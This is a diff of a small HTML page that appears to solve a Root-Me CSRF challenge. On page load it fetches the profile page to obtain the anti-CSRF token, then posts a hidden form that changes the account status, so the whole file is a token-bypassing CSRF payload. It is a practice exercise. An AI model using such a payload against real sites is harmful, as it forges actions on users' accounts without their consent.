@@ -1,10 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dani</title>
+</head>
+
 <body onload="get()">
 
-<form id="form-payload" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="POST" enctype="multipart/form-data">
+<form id="form-payload" action="?action=profile" method="POST" enctype="multipart/form-data">
   <input type="hidden" name="username" value="test"/>
   <input type="hidden" name="status" value="on"/>
   <input type="hidden" id="token" name="token" value=""/>
-  <input type="submit" value="go"/>
+  <input type="submit" value="ok"/>
 </form>
 
 <script>
@@ -24,7 +30,10 @@
 	function get() 
 	{
 	  x.open("GET","?action=profile",true);
-	  x.send(); 
+	  x.send(null); 
 	}
 
 </script>
+</body>
+</html>
+
